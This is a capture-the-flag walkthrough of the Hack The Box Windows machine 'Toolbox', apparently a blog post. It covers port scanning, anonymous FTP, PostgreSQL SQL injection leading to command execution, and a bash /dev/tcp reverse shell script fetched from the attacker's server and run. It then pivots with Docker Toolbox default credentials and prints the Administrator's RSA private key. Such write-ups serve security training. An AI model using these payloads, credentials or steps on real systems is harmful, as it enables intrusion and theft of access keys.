---
layout: single
title: Toolbox  - Hack The Box
excerpt: "Toolbox is an easy difficulty Windows machine that features a Docker Toolbox installation. Docker Toolbox is used to host a Linux container, which serves a site that is found vulnerable to SQL injection. This is leveraged to gain a foothold on the Docker container. Docker Toolbox default credentials and host file system access are leveraged to gain a privileged shell on the host."
date: 2025-06-05
classes: wide
header:
  teaser: /img2/toolbox.PNG
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Windows
  - Easy
tags:
  - PostgreSQL Injection (RCE)
  - Abusing boot2docker [Docker-Toolbox]
  - Pivoting
---


## Reconnaissance

- Nmap 

```bash
❯ nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.10.236
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 10:55 CEST
Initiating SYN Stealth Scan at 10:55
Scanning 10.10.10.236 [65535 ports]
Discovered open port 445/tcp on 10.10.10.236
Discovered open port 139/tcp on 10.10.10.236
Discovered open port 21/tcp on 10.10.10.236
Discovered open port 443/tcp on 10.10.10.236
Discovered open port 135/tcp on 10.10.10.236
Discovered open port 22/tcp on 10.10.10.236
Discovered open port 49669/tcp on 10.10.10.236
Discovered open port 49664/tcp on 10.10.10.236
Discovered open port 49664/tcp on 10.10.10.236
Discovered open port 49668/tcp on 10.10.10.236
Discovered open port 5985/tcp on 10.10.10.236
Increasing send delay for 10.10.10.236 from 0 to 5 due to max_successful_tryno increase to 4
Discovered open port 49666/tcp on 10.10.10.236
Increasing send delay for 10.10.10.236 from 5 to 10 due to max_successful_tryno increase to 5
Discovered open port 47001/tcp on 10.10.10.236
Discovered open port 49665/tcp on 10.10.10.236
Discovered open port 49667/tcp on 10.10.10.236
Discovered open port 49667/tcp on 10.10.10.236
Discovered open port 49667/tcp on 10.10.10.236
Completed SYN Stealth Scan at 10:56, 44.11s elapsed (65535 total ports)
Nmap scan report for 10.10.10.236
Host is up, received user-set (0.077s latency).
Scanned at 2025-06-04 10:55:32 CEST for 44s
Not shown: 61685 closed tcp ports (reset), 3836 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack ttl 127
22/tcp    open  ssh          syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
443/tcp   open  https        syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 44.24 seconds
           Raw packets sent: 215256 (9.471MB) | Rcvd: 71739 (2.870MB)
```

- FTP anonymous login

```bash
ftp 10.10.10.236
Connected to 10.10.10.236.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (10.10.10.236:pyuser): anonymous
331 Password required for anonymous
Password: 
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||59059|)
150 Opening data channel for directory listing of "/"
-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
226 Successfully transferred "/"
ftp> 
```

- Vulnerability and version scan

```bash
❯ nmap -sCV -p443 10.10.10.236
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 12:01 CEST
Nmap scan report for admin.megalogistic.com (10.10.10.236)
Host is up (0.048s latency).

PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Apache httpd 2.4.38 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR
| Not valid before: 2020-02-18T17:45:56
|_Not valid after:  2021-02-17T17:45:56
|_http-title: Administrator Login
|_http-server-header: Apache/2.4.38 (Debian)
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.93 seconds
```

- Add subdomain to local DNS

```bash
echo "10.10.10.236 admin.megalogistic.com" >> /etc/hosts
```

- Force PostgreSQL error

![](/img2/Pasted%20image%2020250604120417.png)

```sql
WHERE username = 'admin''or 1=1-- AND password = md5('admin'');
```

## Exploitation

- PostgreSQL Injection

![](/img2/Pasted%20image%2020250604131556.png)

> The web will be return the response after 10 seconds.


- PostgreSQL Injection -> RCE

![](/img2/Pasted%20image%2020250604131930.png)

![](/img2/Pasted%20image%2020250604132136.png)

```bash
❯ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.236 - - [04/Jun/2025 13:20:44] code 404, message File not found
10.10.10.236 - - [04/Jun/2025 13:20:44] "GET /test HTTP/1.1" 404 -
```

- Reverse shell

```bash
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.16.7/9000 0>&1'
```

> Create bash.sh

![](/img2/Pasted%20image%2020250604133508.png)

> Download bash.sh and execute

```bash
❯ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.236 - - [04/Jun/2025 13:33:52] "GET /bash.sh HTTP/1.1" 200 -
```

```bash
❯ nc -nlvp 9000
listening on [any] 9000 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.236] 49872
bash: cannot set terminal process group (371): Inappropriate ioctl for device
bash: no job control in this shell
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$
```

## Post-exploitation

- Check ip and routes

```bash
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ hostname -I

172.17.0.2 
```

```bash
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ route -n

Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         172.17.0.1      0.0.0.0         UG    0      0        0 eth0
172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 eth0
```

- Scan port 22 of 172.17.0.1

```bash
echo '' > /dev/tcp/172.17.0.1/22
```

> No response, so port 22 is open

- Connect ssh with docker-toolbox default credentials

> In ftp server we found a docker-toolbox file, so we can search about default passwords

![](/img2/Pasted%20image%2020250604135004.png)

```bash
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ssh docker@172.17.0.1

docker@172.17.0.1's password: tcuser

   ( '>')
  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.
 (/-_--_-\)           www.tinycorelinux.net

docker@box:~$ 
```

- Find ssh private key

```bash
docker@box:~$ ip a 
```

```php        
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:f2:5e:be brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fef2:5ebe/64 scope link 
       valid_lft forever preferred_lft forever
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:2c:6d:87 brd ff:ff:ff:ff:ff:ff
    inet 192.168.99.100/24 brd 192.168.99.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe2c:6d87/64 scope link 
       valid_lft forever preferred_lft forever
4: sit0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/sit 0.0.0.0 brd 0.0.0.0
5: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:5b:a9:b1:4f brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:5bff:fea9:b14f/64 scope link 
       valid_lft forever preferred_lft forever
7: veth6406f52@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether de:87:e5:13:01:e9 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::dc87:e5ff:fe13:1e9/64 scope link 
       valid_lft forever preferred_lft forever
```

> We aren´t inside victim's machine, so we can search mounts

```bash
docker@box:~$ ls /
```  

```php
bin           home          linuxrc       root          sys
c             init          mnt           run           tmp
dev           lib           opt           sbin          usr
etc           lib64         proc          squashfs.tgz  var
```

> We find a unusual directory in /, maybe can be Windows mount

```bash
docker@box:~$ ls -la /c/Users/Administrator/
```

```php
total 1597
drwxrwxrwx    1 docker   staff         8192 Feb  8  2021 .
dr-xr-xr-x    1 docker   staff         4096 Feb 19  2020 ..
drwxrwxrwx    1 docker   staff         4096 Jun  5 12:48 .VirtualBox
drwxrwxrwx    1 docker   staff            0 Feb 18  2020 .docker
drwxrwxrwx    1 docker   staff            0 Feb 19  2020 .ssh
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 3D Objects
drwxrwxrwx    1 docker   staff            0 Feb 18  2020 AppData
drwxrwxrwx    1 docker   staff            0 Feb 19  2020 Application Data
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Contacts
drwxrwxrwx    1 docker   staff            0 Sep 15  2018 Cookies
dr-xr-xr-x    1 docker   staff            0 Feb  8  2021 Desktop
dr-xr-xr-x    1 docker   staff         4096 Feb 19  2020 Documents
dr-xr-xr-x    1 docker   staff            0 Apr  5  2021 Downloads
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Favorites
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Links
drwxrwxrwx    1 docker   staff         4096 Feb 18  2020 Local Settings
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Music
dr-xr-xr-x    1 docker   staff         4096 Feb 19  2020 My Documents
-rwxrwxrwx    1 docker   staff       262144 Jan 11  2022 NTUSER.DAT
-rwxrwxrwx    1 docker   staff        65536 Feb 18  2020 NTUSER.DAT{1651d10a-52b3-11ea-b3e9-000c29d8029c}.TM.blf
-rwxrwxrwx    1 docker   staff       524288 Feb 18  2020 NTUSER.DAT{1651d10a-52b3-11ea-b3e9-000c29d8029c}.TMContainer00000000000000000001.regtrans-ms
-rwxrwxrwx    1 docker   staff       524288 Feb 18  2020 NTUSER.DAT{1651d10a-52b3-11ea-b3e9-000c29d8029c}.TMContainer00000000000000000002.regtrans-ms
drwxrwxrwx    1 docker   staff            0 Sep 15  2018 NetHood
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Pictures
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Recent
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Saved Games
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Searches
dr-xr-xr-x    1 docker   staff            0 Sep 15  2018 SendTo
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Start Menu
drwxrwxrwx    1 docker   staff            0 Sep 15  2018 Templates
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Videos
-rwxrwxrwx    1 docker   staff       147456 Feb 18  2020 ntuser.dat.LOG1
-rwxrwxrwx    1 docker   staff        81920 Feb 18  2020 ntuser.dat.LOG2
-rwxrwxrwx    1 docker   staff           20 Feb 18  2020 ntuser.ini
```

> We find .ssh directory, maybe can get ssh private key

```bash
docker@box:~$ cat /c/Users/Administrator/.ssh/id_rsa
```

```php
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvo4SLlg/dkStA4jDUNxgF8kbNAF+6IYLNOOCeppfjz6RSOQv
Md08abGynhKMzsiiVCeJoj9L8GfSXGZIfsAIWXn9nyNaDdApoF7Mfm1KItgO+W9m
M7lArs4zgBzMGQleIskQvWTcKrQNdCDj9JxNIbhYLhJXgro+u5dW6EcYzq2MSORm
7A+eXfmPvdr4hE0wNUIwx2oOPr2duBfmxuhL8mZQWu5U1+Ipe2Nv4fAUYhKGTWHj
4ocjUwG9XcU0iI4pcHT3nXPKmGjoPyiPzpa5WdiJ8QpME398Nne4mnxOboWTp3jG
aJ1GunZCyic0iSwemcBJiNyfZChTipWmBMK88wIDAQABAoIBAH7PEuBOj+UHrM+G
Stxb24LYrUa9nBPnaDvJD4LBishLzelhGNspLFP2EjTJiXTu5b/1E82qK8IPhVlC
JApdhvDsktA9eWdp2NnFXHbiCg0IFWb/MFdJd/ccd/9Qqq4aos+pWH+BSFcOvUlD
vg+BmH7RK7V1NVFk2eyCuS4YajTW+VEwD3uBAl5ErXuKa2VP6HMKPDLPvOGgBf9c
l0l2v75cGjiK02xVu3aFyKf3d7t/GJBgu4zekPKVsiuSA+22ZVcTi653Tum1WUqG
MjuYDIaKmIt9QTn81H5jAQG6CMLlB1LZGoOJuuLhtZ4qW9fU36HpuAzUbG0E/Fq9
jLgX0aECgYEA4if4borc0Y6xFJxuPbwGZeovUExwYzlDvNDF4/Vbqnb/Zm7rTW/m
YPYgEx/p15rBh0pmxkUUybyVjkqHQFKRgu5FSb9IVGKtzNCtfyxDgsOm8DBUvFvo
qgieIC1S7sj78CYw1stPNWS9lclTbbMyqQVjLUvOAULm03ew3KtkURECgYEA17Nr
Ejcb6JWBnoGyL/yEG44h3fHAUOHpVjEeNkXiBIdQEKcroW9WZY9YlKVU/pIPhJ+S
7s++kIu014H+E2SV3qgHknqwNIzTWXbmqnclI/DSqWs19BJlD0/YUcFnpkFG08Xu
iWNSUKGb0R7zhUTZ136+Pn9TEGUXQMmBCEOJLcMCgYBj9bTJ71iwyzgb2xSi9sOB
MmRdQpv+T2ZQQ5rkKiOtEdHLTcV1Qbt7Ke59ZYKvSHi3urv4cLpCfLdB4FEtrhEg
5P39Ha3zlnYpbCbzafYhCydzTHl3k8wfs5VotX/NiUpKGCdIGS7Wc8OUPBtDBoyi
xn3SnIneZtqtp16l+p9pcQKBgAg1Xbe9vSQmvF4J1XwaAfUCfatyjb0GO9j52Yp7
MlS1yYg4tGJaWFFZGSfe+tMNP+XuJKtN4JSjnGgvHDoks8dbYZ5jaN03Frvq2HBY
RGOPwJSN7emx4YKpqTPDRmx/Q3C/sYos628CF2nn4aCKtDeNLTQ3qDORhUcD5BMq
bsf9AoGBAIWYKT0wMlOWForD39SEN3hqP3hkGeAmbIdZXFnUzRioKb4KZ42sVy5B
q3CKhoCDk8N+97jYJhPXdIWqtJPoOfPj6BtjxQEBoacW923tOblPeYkI9biVUyIp
BYxKDs3rNUsW1UUHAvBh0OYs+v/X+Z/2KVLLeClznDJWh/PNqF5I
-----END RSA PRIVATE KEY-----
```

```bash
chmod 600 id_rsa
```

```bash
ssh Administrator@10.10.10.236 -i id_rsa
```


![](/img2/Pasted%20image%2020250605150544.png)